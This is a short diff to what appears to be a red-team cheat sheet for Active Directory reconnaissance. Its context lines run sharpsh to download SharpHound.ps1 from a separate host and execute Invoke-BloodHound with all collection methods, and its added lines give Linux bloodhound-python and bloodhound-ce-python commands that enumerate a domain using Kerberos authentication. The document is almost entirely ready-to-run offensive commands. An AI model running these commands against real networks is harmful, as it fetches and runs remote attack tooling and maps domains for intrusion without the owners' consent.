@@ -27,3 +27,14 @@
 
     sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup"'
     sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/SharpHound.ps1 -c "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -SearchForest"'
+
+## Linux
+
+CE
+
+    bloodhound-ce-python -k -no-pass -c All -ns 10.10.100.15 -d domain.com -u machine05\$ --zip
+
+
+Legacy
+
+    bloodhound-python -k -no-pass -c All -ns 10.10.100.15 -d domain.com -u user --zip
